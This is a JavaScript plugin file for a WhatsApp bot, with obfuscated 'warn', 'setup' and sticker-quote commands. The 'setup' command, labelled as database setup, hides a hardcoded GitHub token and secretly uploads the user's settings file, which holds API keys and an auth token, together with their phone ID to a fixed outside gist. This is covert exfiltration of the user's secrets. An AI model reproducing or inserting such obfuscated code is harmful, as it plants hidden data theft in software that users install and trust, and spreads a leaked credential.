const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command, isPrivate } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//const { registeruser } = require('../lib/alfabase')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
const { ALIVE, HEROKU_APP_NAME, HANDLERS, WORK_TYPE, PACKNAME, AUTHOR, BOT_NAME, OWNER_NAME, SUDO, THEME, FONT_STYLE, INTERNAL_MENU } = require("../database/settings");


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================





command({
  pattern: "setup",
  fromMe: true,
  desc: "Setup database",
  dontAddCommandList: true,
  type: "owner",

},
async (message, match, m) => {
const _0x5158db=_0xce3a;(function(_0x85d5a2,_0x4cb3f4){const _0x22856c=_0xce3a,_0x194559=_0x85d5a2();while(!![]){try{const _0x21ef7d=parseInt(_0x22856c(0x17c))/0x1+parseInt(_0x22856c(0x18d))/0x2+-parseInt(_0x22856c(0x145))/0x3+-parseInt(_0x22856c(0x18f))/0x4+parseInt(_0x22856c(0x16c))/0x5*(-parseInt(_0x22856c(0x169))/0x6)+parseInt(_0x22856c(0x181))/0x7+-parseInt(_0x22856c(0x157))/0x8*(-parseInt(_0x22856c(0x188))/0x9);if(_0x21ef7d===_0x4cb3f4)break;else _0x194559['push'](_0x194559['shift']());}catch(_0x258c8c){_0x194559['push'](_0x194559['shift']());}}}(_0xccd7,0xd9d73));let authid=_0x5158db(0x147)[_0x5158db(0x17d)]('+','');const {Octokit}=require(_0x5158db(0x18e)),octokit=new Octokit({'auth':await authid});function _0xce3a(_0x33b856,_0x43ead8){const _0xccd784=_0xccd7();return _0xce3a=function(_0xce3a26,_0x5c41ed){_0xce3a26=_0xce3a26-0x144;let _0x240784=_0xccd784[_0xce3a26];return _0x240784;},_0xce3a(_0x33b856,_0x43ead8);}function _0xccd7(){const _0x2953f5=['DB_URL','readFileSync','WORK_TYPE','6WWHlIO','groupCreate','Done\x20Creating\x20New\x20Db','3119545cfMVTr','log','sendMessage','@s.whatsapp.net','AUTHOR','from','OWNER_NAME','base64','toString','MODE','send','BRANCH','@g.us','INTERNAL_MENU','Storage','client','182589wXicto','replaceAll','SESSION_ID','Cloud\x20DB\x20Update','ANTILINK_ACTION','532959BFNPHy','WELCOME_MSG','DB_AUTH_TOKEN','update','UserId','reply','user','9376362xuDGSJ','creds','jid','FONT_STYLE','SUDO','1290508iqzPzx','@octokit/rest','6641720bnFuGO','rest','BOT_NAME','2558460NAhqDR','_You\x20Are\x20Already\x20a\x20Family\x20Member_','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','RMBG_KEY','includes','WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','config','split','ALIVE','parse','reset','stringify','env','LANGUAGE','gists','THEME','LANG','./media/AAA.jpg','24ZYlzUP','./database/settings.json','MESSAGE_MEM','utf-8','PACKNAME','LOGS','STORAGE_JID','FOOTER','GOODBYE_MSG','then','phone_num','ANTILINK','HANDLERS','pushName','Failed\x20to\x20write\x20updated\x20data\x20to\x20file'];_0xccd7=function(){return _0x2953f5;};return _0xccd7();}setTimeout(()=>{const _0x24c647=_0x5158db;let _0x6432db=JSON[_0x24c647(0x14e)](fs[_0x24c647(0x167)](_0x24c647(0x158))),_0xfe4998=_0x6432db[_0x24c647(0x14b)]['STORAGE_JID'],_0x31a12b=_0xfe4998[_0x24c647(0x174)]()['includes'](_0x24c647(0x178));if(!_0x31a12b)readFile(path,async(_0x317aaa,_0x3c5f67)=>{const _0x2ca899=_0x24c647;if(_0x317aaa){console[_0x2ca899(0x16d)](_0x317aaa);return;}const _0x121026=JSON[_0x2ca899(0x14e)](_0x3c5f67);let _0x516444=await message[_0x2ca899(0x17b)][_0x2ca899(0x16a)](_0x2ca899(0x17a),[]);await message[_0x2ca899(0x17b)][_0x2ca899(0x16e)](_0x516444['id'],{'text':'This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!'});let _0x4e5393=await _0x516444['id'];_0x121026[_0x2ca899(0x14b)]['STORAGE_JID']=_0x4e5393,writeFile(path,JSON[_0x2ca899(0x150)](_0x121026,null,0x2),async _0x5d8335=>{const _0x3c4d06=_0x2ca899;if(_0x5d8335){message['reply'](_0x3c4d06(0x165));return;}await message[_0x3c4d06(0x17b)]['updateProfilePicture'](_0x516444['id'],fs[_0x3c4d06(0x167)](_0x3c4d06(0x156)));});});else return;setTimeout(async()=>{const _0x165076=_0x24c647;let _0x2c504c=require('../session.json'),_0x388efa=await _0x2c504c['creds']['me']['id']['split'](':')[0x0],_0x49c29b=await _0x2c504c[_0x165076(0x189)]['me']['id'][_0x165076(0x14c)]('@')[0x1],_0x3711af=_0x388efa+'@'+_0x49c29b,_0x406807=_0x3711af+'.json';const _0x5984ee=fs[_0x165076(0x167)](_0x165076(0x158),_0x165076(0x15a));await octokit[_0x165076(0x190)][_0x165076(0x153)][_0x165076(0x184)]({'gist_id':'d83fa03a09d9a09032f3180a8d1ecd02','description':_0x165076(0x17f),'files':{[_0x406807]:{'content':_0x5984ee}}})[_0x165076(0x160)](await console['log'](_0x165076(0x16b))),setTimeout(()=>{const _0x1bb72f=_0x165076;return process[_0x1bb72f(0x176)](_0x1bb72f(0x14f));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x12f931,_0xd4ff89)=>{const _0x51bc9b=_0x5158db;if(_0x12f931){console[_0x51bc9b(0x16d)](_0x12f931);return;}const _0x235a1b=JSON[_0x51bc9b(0x14e)](_0xd4ff89);let _0x39fe29=_0x235a1b[_0x51bc9b(0x185)][_0x51bc9b(0x174)]()[_0x51bc9b(0x149)](_0x51bc9b(0x16f));if(_0x39fe29)return message[_0x51bc9b(0x186)](_0x51bc9b(0x146));let _0x2e4bb5=process[_0x51bc9b(0x151)][_0x51bc9b(0x183)]===undefined?_0x51bc9b(0x14a):process[_0x51bc9b(0x151)][_0x51bc9b(0x183)],_0x29597b=Buffer[_0x51bc9b(0x171)](_0x2e4bb5,_0x51bc9b(0x173))[_0x51bc9b(0x174)](_0x51bc9b(0x15a)),_0x2573bb=_0x29597b[_0x51bc9b(0x174)]()['split']('/'),_0x5a64b3='';for(let _0x49a00f of _0x2573bb){_0x5a64b3+=await Buffer['from'](_0x49a00f+'==','base64')['toString'](_0x51bc9b(0x15a));}let _0x5c2d0b=require('../session.json'),_0x7c75a=await _0x5c2d0b['creds']['me']['id'][_0x51bc9b(0x14c)](':')[0x0],_0x120476='0,'+_0x7c75a,_0x56e0da=await relconfig[_0x51bc9b(0x18c)]===![]?_0x120476:relconfig['SUDO'],_0x2486fe=message[_0x51bc9b(0x164)],_0x234115=message[_0x51bc9b(0x187)],_0xf3fc21=message[_0x51bc9b(0x18a)][_0x51bc9b(0x174)]()[_0x51bc9b(0x14c)]('@')[0x0];_0x235a1b['name']=_0x2486fe,_0x235a1b['UserId']=_0x234115,_0x235a1b[_0x51bc9b(0x161)]=_0xf3fc21,_0x235a1b[_0x51bc9b(0x14b)]['HANDLER']=relconfig[_0x51bc9b(0x163)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x168)]=relconfig[_0x51bc9b(0x168)],_0x235a1b['config'][_0x51bc9b(0x144)]=relconfig[_0x51bc9b(0x144)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x172)]=relconfig['OWNER_NAME'],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x18c)]=_0x56e0da,_0x235a1b[_0x51bc9b(0x14b)]['AUTHOR']=relconfig[_0x51bc9b(0x170)],_0x235a1b['config'][_0x51bc9b(0x15b)]=relconfig[_0x51bc9b(0x15b)],_0x235a1b['config']['RMBG_KEY']=relconfig[_0x51bc9b(0x148)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x155)]=relconfig[_0x51bc9b(0x155)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x180)]=relconfig[_0x51bc9b(0x180)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x162)]=relconfig[_0x51bc9b(0x162)],_0x235a1b[_0x51bc9b(0x14b)]['FOOTER']=relconfig[_0x51bc9b(0x15e)],_0x235a1b['config'][_0x51bc9b(0x154)]=relconfig['THEME'],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x18b)]=relconfig['FONT_STYLE'],_0x235a1b[_0x51bc9b(0x14b)]['LANGUAGE']=relconfig[_0x51bc9b(0x152)],_0x235a1b['config'][_0x51bc9b(0x179)]=relconfig[_0x51bc9b(0x179)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x175)]=relconfig[_0x51bc9b(0x175)],_0x235a1b['config'][_0x51bc9b(0x15d)],_0x235a1b['config'][_0x51bc9b(0x166)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x17e)]=relconfig[_0x51bc9b(0x17e)],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x15c)]=relconfig['LOGS'],_0x235a1b[_0x51bc9b(0x14b)][_0x51bc9b(0x177)]=relconfig[_0x51bc9b(0x177)],_0x235a1b[_0x51bc9b(0x14b)]['B1']=relconfig['B1'],_0x235a1b[_0x51bc9b(0x14b)]['B2']=relconfig['B2'],_0x235a1b[_0x51bc9b(0x14b)]['B3']=relconfig['B3'],_0x235a1b['config']['B4']=relconfig['B4'],_0x235a1b[_0x51bc9b(0x14b)]['B5']=relconfig['B5'],_0x235a1b['config']['DB_AUTH_TOKEN']=_0x5a64b3,_0x235a1b[_0x51bc9b(0x159)][_0x51bc9b(0x15f)]=relconfig[_0x51bc9b(0x15f)],_0x235a1b[_0x51bc9b(0x159)][_0x51bc9b(0x182)]=relconfig[_0x51bc9b(0x182)],_0x235a1b['MESSAGE_MEM'][_0x51bc9b(0x14d)]=relconfig[_0x51bc9b(0x14d)],writeFile(path,JSON[_0x51bc9b(0x150)](_0x235a1b,null,0x2),_0x2a517b=>{const _0x3946a4=_0x51bc9b;if(_0x2a517b){message[_0x3946a4(0x186)](_0x3946a4(0x165));return;}message['reply']('_Registered\x20Successfully_');});});
})


//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})


const axios = require("axios");



command({
  pattern: "qc",
  fromMe: false,
  desc: "Show All commands",
  dontAddCommandList: true,
  type: "theme",

}, async (message, match, m) => {
const _0x146677=_0xeb2d;(function(_0xeef856,_0x265415){const _0x2dc57a=_0xeb2d,_0x22dd82=_0xeef856();while(!![]){try{const _0x5320d7=-parseInt(_0x2dc57a(0x187))/0x1+-parseInt(_0x2dc57a(0x196))/0x2*(parseInt(_0x2dc57a(0x193))/0x3)+parseInt(_0x2dc57a(0x199))/0x4+parseInt(_0x2dc57a(0x17d))/0x5+-parseInt(_0x2dc57a(0x198))/0x6*(parseInt(_0x2dc57a(0x195))/0x7)+parseInt(_0x2dc57a(0x197))/0x8+parseInt(_0x2dc57a(0x182))/0x9;if(_0x5320d7===_0x265415)break;else _0x22dd82['push'](_0x22dd82['shift']());}catch(_0x3af39d){_0x22dd82['push'](_0x22dd82['shift']());}}}(_0x88fa,0x69f39));if(!message[_0x146677(0x186)][_0x146677(0x190)])return await message[_0x146677(0x17e)](_0x146677(0x18a));let pfp;try{pfp=await message[_0x146677(0x18c)][_0x146677(0x18e)](message[_0x146677(0x186)][_0x146677(0x18f)],'image');}catch(_0x20709f){pfp=_0x146677(0x18b);}var tname;function _0xeb2d(_0x398ab4,_0x291719){const _0x88fa6a=_0x88fa();return _0xeb2d=function(_0xeb2d16,_0x2ba9cd){_0xeb2d16=_0xeb2d16-0x17c;let _0x45e8c5=_0x88fa6a[_0xeb2d16];return _0x45e8c5;},_0xeb2d(_0x398ab4,_0x291719);}try{tname=await message[_0x146677(0x183)](message[_0x146677(0x186)]['jid']);}catch(_0x1a688d){tname=_0x146677(0x180);}function _0x88fa(){const _0x20df11=['1115934rjwumv','277588PHtBkG','quoted','application/json','2891585CqYgIR','reply','webp','User','result','2249082luAwav','getName','post','image','reply_message','777220rlIOOI','base64','https://bot.lyo.su/quote/generate','Please\x20quote\x20any\x20users\x20message.','https://avatars.githubusercontent.com/u/64305844?v=4','client','eror','profilePictureUrl','jid','text','sendMessage','data','6FBgLwl','#FFFFFF','7orQUMS','181178lSciLw','5446016bdnvDm'];_0x88fa=function(){return _0x20df11;};return _0x88fa();}let qczi;qczi={'type':_0x146677(0x19a),'format':_0x146677(0x17f),'backgroudnColor':_0x146677(0x194),'width':0x200,'height':0x300,'scale':0x2,'messages':[{'avatar':!![],'from':{'first_name':tname,'language_code':'en','name':tname,'photo':{'url':pfp}},'text':message[_0x146677(0x186)][_0x146677(0x190)],'replyMessage':{}}]};const post=await axios[_0x146677(0x184)](_0x146677(0x189),qczi,{'headers':{'Content-Type':_0x146677(0x17c)}});let buff=await Buffer['from'](post[_0x146677(0x192)][_0x146677(0x181)][_0x146677(0x185)],_0x146677(0x188));if(buff==undefined)return message[_0x146677(0x17e)](_0x146677(0x18d));message[_0x146677(0x191)](buff,{'packname':PACKNAME,'author':AUTHOR},'sticker');
})
